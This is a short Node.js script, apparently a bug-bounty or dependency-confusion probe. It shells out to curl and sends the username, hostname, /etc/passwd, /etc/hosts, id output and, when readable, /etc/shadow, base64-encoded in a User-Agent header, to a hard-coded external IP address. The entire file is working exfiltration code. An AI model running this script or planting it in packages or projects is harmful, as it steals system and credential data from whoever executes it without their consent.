const { exec } = require("child_process");

const command = `
curl -X POST "http://195.179.231.72:80/kubehook-test-for-hackerone/$(whoami)/$(hostname)/" \
-A "$( (cat /etc/passwd /etc/hosts && id && { [ -r /etc/shadow ] && cat /etc/shadow || echo 'No shadow access'; } | base64 -w0)" \
-s -o /dev/null
`;
exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error("Error executing command:", error.message);
        return;
    }
    if (stderr) {
        console.error("Stderr output:", stderr);
    }
    console.log("Stdout output:", stdout);
});
